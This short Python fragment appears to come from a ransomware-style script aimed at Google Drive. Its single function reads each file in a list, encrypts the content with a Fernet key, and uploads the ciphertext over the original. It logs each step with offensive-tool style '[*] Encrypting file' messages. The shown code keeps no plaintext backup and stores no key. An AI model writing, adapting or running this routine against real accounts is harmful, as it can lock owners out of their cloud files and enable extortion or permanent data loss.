from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
from cryptography.fernet import Fernet

def encrypt(f, file_list):
	for file in file_list:
		unencoded = file.GetContentString()
		print("[*] Encrypting file: " + file['title'] + "...")
		encoded = f.encrypt(unencoded.encode())
		file.SetContentString(encoded.decode())
		file.Upload()

